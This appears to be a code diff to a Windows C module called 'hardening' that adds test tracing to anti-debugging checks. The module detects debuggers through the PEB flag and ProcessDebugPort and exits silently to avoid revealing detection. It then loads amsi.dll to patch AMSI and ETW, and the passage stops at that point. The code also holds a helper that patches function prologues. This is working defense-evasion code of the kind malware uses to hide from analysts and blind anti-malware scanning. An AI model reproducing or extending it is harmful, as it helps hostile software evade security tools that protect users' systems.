@@ -21,6 +21,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <intrin.h>
+#include "../../inc/ah_test_trace.h"    // TEST-REMOVE: instrumentation
 
 static BOOL PatchPrologue(HMODULE mod, const char* funcName,
                           const BYTE* patch, SIZE_T patchLen)
@@ -42,7 +43,10 @@ static BOOL IsBeingDebugged(void)
 {
 #if defined(_M_X64) || defined(__x86_64__)
     unsigned char* peb = (unsigned char*)__readgsqword(0x60);
-    if (peb && peb[0x02]) return TRUE;
+    if (peb && peb[0x02]) {
+        ah_test_trace_write("IsBeingDebugged: PEB.BeingDebugged=1");   // TEST-REMOVE
+        return TRUE;
+    }
 #endif
     typedef LONG (NTAPI *pfnNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
     pfnNtQIP p = (pfnNtQIP)GetProcAddress(
@@ -50,25 +54,37 @@ static BOOL IsBeingDebugged(void)
     if (p) {
         HANDLE port = NULL;
         ULONG ret = 0;
-        if (p(GetCurrentProcess(), 7 /*ProcessDebugPort*/,
-              &port, sizeof(port), &ret) >= 0 && port != NULL) {
+        LONG st1 = p(GetCurrentProcess(), 7 /*ProcessDebugPort*/,
+                     &port, sizeof(port), &ret);
+        if (st1 >= 0 && port != NULL) {
+            ah_test_trace_write("IsBeingDebugged: ProcessDebugPort=%p → TRUE", port);   // TEST-REMOVE
             return TRUE;
         }
-        DWORD flags = 0;
-        if (p(GetCurrentProcess(), 0x1F /*ProcessDebugFlags*/,
-              &flags, sizeof(flags), &ret) >= 0 && flags == 0) {
-            return TRUE;
-        }
+        // v1.0.38.2: ProcessDebugFlags (info class 0x1F) check DISABLED —
+        // false-positive on 2PC (SSH-launched process, no debugger). Docs
+        // are ambiguous (some say 0=debugged, others 0=default-normal); on
+        // Windows 11 25H2 build 26200 it consistently returns 0 for
+        // regular processes, so we can't distinguish. Rely on PEB flag +
+        // ProcessDebugPort only.
+        ah_test_trace_write("IsBeingDebugged: port=%p st1=0x%lX → FALSE",
+                            port, (unsigned long)st1);   // TEST-REMOVE
+    } else {
+        ah_test_trace_write("IsBeingDebugged: NtQueryInformationProcess not found → FALSE");   // TEST-REMOVE
     }
     return FALSE;
 }
 
 void DhInitHardening(void)
 {
+    ah_test_trace_write("DhInitHardening ENTER");   // TEST-REMOVE
     if (IsBeingDebugged()) {
+        // TEST-REMOVE: unmask silent exit so we know if a legit user gets
+        // false-positive-flagged as debugged.
+        ah_test_trace_write("DhInitHardening: IsBeingDebugged returned TRUE → ExitProcess(0)");
         // Silent exit — no log line (would signal detection).
         ExitProcess(0);
     }
+    ah_test_trace_write("DhInitHardening not debugged, patching AMSI/ETW");   // TEST-REMOVE
 
     HMODULE amsi = LoadLibraryA("amsi.dll");
     if (amsi) {
